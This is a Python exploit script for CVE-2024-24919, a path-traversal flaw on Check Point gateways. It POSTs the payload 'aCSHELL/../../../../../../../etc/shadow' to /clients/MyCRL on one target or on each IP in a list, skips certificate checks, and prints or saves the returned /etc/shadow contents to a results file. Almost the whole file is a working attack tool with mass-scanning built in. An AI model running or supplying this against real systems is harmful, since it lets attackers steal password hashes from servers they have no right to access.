#!/usr/bin/env python3

import os
import sys
import argparse
import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Clearing the Screen
os.system('cls')

logo = """
░█████╗░███╗░░██╗██╗███╗░░██╗░█████╗░██╗░░██╗░█████╗░███╗░░██╗███████╗░█████╗░
██╔══██╗████╗░██║██║████╗░██║██╔══██╗██║░░██║██╔══██╗████╗░██║╚════██║██╔══██╗
██║░░██║██╔██╗██║██║██╔██╗██║██║░░██║███████║███████║██╔██╗██║░░███╔═╝██║░░██║
██║░░██║██║╚████║██║██║╚████║██║░░██║██╔══██║██╔══██║██║╚████║██╔══╝░░██║░░██║
╚█████╔╝██║░╚███║██║██║░╚███║╚█████╔╝██║░░██║██║░░██║██║░╚███║███████╗╚█████╔╝
░╚════╝░╚═╝░░╚══╝╚═╝╚═╝░░╚══╝░╚════╝░╚═╝░░╚═╝╚═╝░░╚═╝╚═╝░░╚══╝╚══════╝░╚════╝░

                                P R E S E N T S
"""

title = """
   ______     _______     ____   ___ ____  _  _        ____  _  _   ___  _  ___  
  / ___\ \   / / ____|   |___ \ / _ \___ \| || |      |___ \| || | / _ \/ |/ _ \ 
 | |    \ \ / /|  _| _____ __) | | | |__) | || |_ _____ __) | || || (_) | | (_) |
 | |___  \ V / | |__|_____/ __/| |_| / __/|__   _|_____/ __/|__   _\__, | |\__, |
  \____|  \_/  |_____|   |_____|\___/_____|  |_|      |_____|  |_|   /_/|_|  /_/ 
                                                                                 
This vulnerability allows for unauthenticated file reads on affected server.
Info: https://nvd.nist.gov/vuln/detail/CVE-2024-24919
"""

print(logo)
print(title)

parser = argparse.ArgumentParser()
parser.add_argument('--target', help='The target IP, excluding the protocol (e.g. 192.168.1.200)')
parser.add_argument('--file', help='The file with the IPs of the targets, excluding the protocol (e.g. 192.168.1.200)')
args = parser.parse_args()

if args.target is None and args.file is None:
    print('Target must be provided (e.g. --target 192.168.1.200)')
    print('OR')
    print('File must be provided (e.g. --file ips.txt)')
    sys.exit(0)
    
if args.file is None:
    hostname = args.target
    print("Trying IP: ", hostname)
    url = f"https://{hostname}/clients/MyCRL"
    payload = "aCSHELL/../../../../../../../etc/shadow"
    headers = {
    'Host': hostname,
    'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:126.0) Gecko/20100101 Firefox/126.0',
    'Te': 'trailers',
    'Dnt': '1',
    'Connection': 'keep-alive',
    'Content-Length': '48'
    }
    #headers = {'Host': hostname}
    try:
        r = requests.post(url, data=payload, headers=headers, verify=False, timeout=2)
        r.raise_for_status()
        print(f"SUCCESS! IP {hostname} is vulnerable!")
        print("Server Response:")
        print("-----------------")
        #print(r.request.headers)
        print(r.text)
    except requests.exceptions.HTTPError as errh:
        print ("HTTP Error:",errh)
    except requests.exceptions.ConnectionError as errc:
        print ("Error Connecting:",errc)
    except requests.exceptions.Timeout as errt:
        print ("Timeout Error:",errt)
    except requests.exceptions.RequestException as err:
        print ("Oops, Error:",err)
else:
    file = open(args.file, "r")
    fileout = open("results.txt", "w")
    for hostname in file.readlines():
        hostname = hostname.rstrip('\n')
        print("Testing IP: " + hostname)
        url = f"https://{hostname}/clients/MyCRL"
        payload = "aCSHELL/../../../../../../../etc/shadow"
        headers = {
        'Host': hostname,
        'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:126.0) Gecko/20100101 Firefox/126.0',
        'Te': 'trailers',
        'Dnt': '1',
        'Connection': 'keep-alive',
        'Content-Length': '48'
        }
        #headers = {'Host': hostname}
        try:
            r = requests.post(url, data=payload, headers=headers, verify=False, timeout=2)
            r.raise_for_status()
            print(f"SUCCESS! IP {hostname} is vulnerable!")
            #print("Server Response:")
            #print(r.text)
            fileout.write(f"SUCCESS! IP {hostname} is vulnerable!" + "\n")
            fileout.write("Server Response:" + "\n")
            fileout.write("-----------------" + "\n")
            fileout.write(r.text + "\n")
            fileout.write("-----------------" + "\n")
        except requests.exceptions.HTTPError as errh:
            print ("HTTP Error:",errh)
        except requests.exceptions.ConnectionError as errc:
            print ("Error Connecting:",errc)
        except requests.exceptions.Timeout as errt:
            print ("Timeout Error:",errt)
        except requests.exceptions.RequestException as err:
            print ("Oops, Error:",err)
    fileout.close()